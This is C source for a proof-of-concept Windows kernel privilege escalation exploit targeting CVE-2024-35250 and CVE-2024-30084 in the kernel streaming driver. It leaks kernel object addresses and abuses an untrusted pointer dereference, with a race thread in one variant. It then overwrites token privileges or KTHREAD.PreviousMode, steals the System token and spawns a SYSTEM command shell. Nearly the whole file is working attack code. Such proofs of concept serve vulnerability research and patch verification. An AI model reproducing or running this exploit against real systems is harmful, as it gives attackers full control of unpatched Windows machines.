/*
				PoC Info
--------------------------------------------------------------
Vulnerability:	        CVE-2024-35250/CVE-2024-30084
Tested environment:	    Windows 11 22h2 Build 22621
						Windows 10 20h2 Build 19042
						VMWare Workstation 17 Pro
Weakness:		        CWE-822: Untrusted Pointer Dereference
Required privileges:    Medium IL
--------------------------------------------------------------
*/
#define __STREAMS__
#define _INC_MMREG
//#define _SEP_TOKEN_PRIVILEGES	0xc1b4
#define _PREVIOUS_MODE			0xbaba
#define _CVE_2024_30084			0xcafe
#include "common.h"

#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ksuser.lib")
//#pragma comment(lib, "ntdllp.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "SetupAPI.lib")
#pragma comment(lib, "Advapi32.lib")

int main()
{
	HANDLE hDevice = NULL;
	BOOL res = FALSE;
	NTSTATUS status = 0;
	uint32_t Ret = 0;

#ifdef _CVE_2024_30084
	hDevice = GetKsDevice(KSNAME_Server);
#else
	hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);
#endif

#ifdef _SEP_TOKEN_PRIVILEGES

	HANDLE hToken;
	uint64_t ktoken_obj = 0;
	res = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	if (!res)
	{
		printf("[-] Failed to open current process token\n");
		return res;
	}

	res = GetObjPtr(&ktoken_obj, GetCurrentProcessId(), hToken);
	if (res != NULL)
	{
		return -1;
	}

	printf("[+] Current process TOKEN address = %llx\n", ktoken_obj);
#elif defined _PREVIOUS_MODE

	uint64_t Sysproc = 0;
	uint64_t Curproc = 0;
	uint64_t Curthread = 0;

	HANDLE hCurproc = 0;
	HANDLE hThread = 0;
	//
	// Leak System _EPROCESS kernel address
	//
	Ret = GetObjPtr(&Sysproc, 4, (HANDLE)4);
	if (Ret != NULL)
	{
		return Ret;
	}
	printf("[+] System EPROCESS address: %llx\n", Sysproc);

	//
	// Leak Current _KTHREAD kernel address
	//
	hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	if (hThread != NULL)
	{
		Ret = GetObjPtr(&Curthread, GetCurrentProcessId(), hThread);
		if (Ret != NULL)
		{
			return Ret;
		}
		printf("[+] Current KTHREAD address: %llx\n", Curthread);
	}

	//
	// Leak Current _EPROCESS kernel address
	//
	hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
	if (hCurproc != NULL)
	{
		Ret = GetObjPtr(&Curproc, GetCurrentProcessId(), hCurproc);
		if (Ret != NULL)
		{
			return Ret;
		}
		printf("[+] Current EPROCESS address: %llx\n", Curproc);
	}
#endif

	//
	// Initialize input buffer
	//
#ifdef _CVE_2024_30084
	pInBufProperty->Set = KSPROPSETID_Service;
#else
	pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
#endif
	pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
	pInBufProperty->Id = 0x0;

	//
	// Initialize output buffer
	//
#ifdef _CVE_2024_30084
	pSerialHdr->PropertySet = KSPROPSETID_Service;
#else
	pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
#endif
	pSerialHdr->Count = 0x1;

	pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
	pSerial->Id = 0x0;                // Should be null
#ifdef _CVE_2024_30084
	pSerial->PropTypeSet.Set = KSPROPSETID_Service;
#else
	pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
#endif
	pSerial->PropTypeSet.Flags = 0x0; // Should be null
	pSerial->PropTypeSet.Id = 0x45;   // Irrelevant value

	//
	// Intialize fake property data
	//
	uint64_t ntoskrnl_user_base = 0;
	HMODULE outModule = 0;
	UINT_PTR ntoskrnlBase = GetKernelModuleAddress("ntoskrnl.exe");
	printf("[+] ntoskrnl.exe base address = %llx\n", ntoskrnlBase);
	pOutBufPropertyData->FakeBitmap = (PRTL_BITMAP)AllocateBitmap(sizeof(RTL_BITMAP), Ptr64(0x10000000));

#ifdef _SEP_TOKEN_PRIVILEGES
	//
	// FakeBitmap initialization for the overwriting TOKEN.Privileges fields technique
	//
	// It should be (0x20 * n) to overwrite (n/2 * 0x8) bytes at arbitrary address
	pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x20 * 4;
	pOutBufPropertyData->FakeBitmap->Buffer = Ptr64(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);
	pInBufPropertyData->ptr_ArbitraryFunCall = Ptr64(leak_gadget_address("RtlSetAllBits"));
	printf("[!] RtlSetAllBits kernel address = %p\n", pInBufPropertyData->ptr_ArbitraryFunCall);
#elif defined _PREVIOUS_MODE
	//
	// FakeBitmap initialization for the overwriting KTHREAD.PreviousMode field technique
	//
	pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x20;
	pOutBufPropertyData->FakeBitmap->Buffer = Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621);
	pInBufPropertyData->ptr_ArbitraryFunCall = Ptr64(leak_gadget_address("RtlClearAllBits"));
	printf("[!] RtlClearAllBits kernel address = %p\n", pInBufPropertyData->ptr_ArbitraryFunCall);
#endif

	//
	// Send property request to trigger the vulnerability
	//
#ifdef _CVE_2024_30084

	HANDLE hRaceThread = CreateThread(NULL, 0, ModifySetValue, NULL, 0, NULL);

	if (hRaceThread == NULL)
	{
		printf("[-] Failed to create racing thread\n");
		return FALSE;
	}
	SetThreadPriority(hRaceThread, THREAD_PRIORITY_TIME_CRITICAL);
	
	printf("[*] Start the race...\n");
	for (int i = 0; i < 10000; ++i)
	{
		res = SendIoctlReq(hDevice);
	}
#else
	res = SendIoctlReq(hDevice);

	if (!res)
	{
		printf("[-] SendIoctlReq failed\n"); // It's ok to see this message if exploit succeded
	}
#endif

#ifdef _SEP_TOKEN_PRIVILEGES

	HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPidByName(L"winlogon.exe"));

	if (!hWinLogon)
	{
		printf("[-] OpenProcess failed with error = %lx\n", GetLastError());
		return FALSE;
	}

	CreateProcessFromHandle(hWinLogon, (LPSTR)"cmd.exe");

	return TRUE;

#elif defined _PREVIOUS_MODE
	printf("[!] Leveraging DKOM to achieve LPE\n");
	printf("[!] Calling Write64 wrapper to overwrite current EPROCESS->Token\n");

	KPROCESSOR_MODE mode = UserMode; // We set UserMode in restoring thread state phase to avoid BSOD in further process creations

	Write64(Ptr64(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), Ptr64(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), TOKEN_SIZE);

	//
	// Restoring KTHREAD.PreviousMode phase
	//
	Write64(Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621), &mode, sizeof(mode));

	//
	// Spawn the shell with "nt authority\system"
	//
	system("cmd.exe");
#endif

	return 0;
}
